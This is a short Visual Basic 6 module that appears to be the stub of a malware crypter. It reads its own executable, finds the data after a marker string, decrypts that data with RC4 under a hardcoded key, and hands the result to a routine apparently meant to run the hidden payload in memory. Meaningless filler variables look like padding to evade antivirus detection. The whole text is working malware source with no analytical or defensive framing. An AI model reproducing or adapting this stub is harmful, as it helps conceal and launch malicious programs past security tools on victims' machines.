Attribute VB_Name = "cc"

Private Sub Main()
On Error Resume Next
Call Intro
Dim Hey, Jey As String
If Hey + Jey <= 4096 Then
Jey = 2048 And Hey = 2048
End If

Dim Info As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
Info = Input(LOF(1), 1)
Close #1

Info = Mid(Info, InStr(Info, "1234567890") + 10, Len(Info))
Info = RC4_String(Info, "xlm32api")
Ejecutar App.Path + "\" + App.EXEName, STRING_TO_BYTES(Info)
End Sub
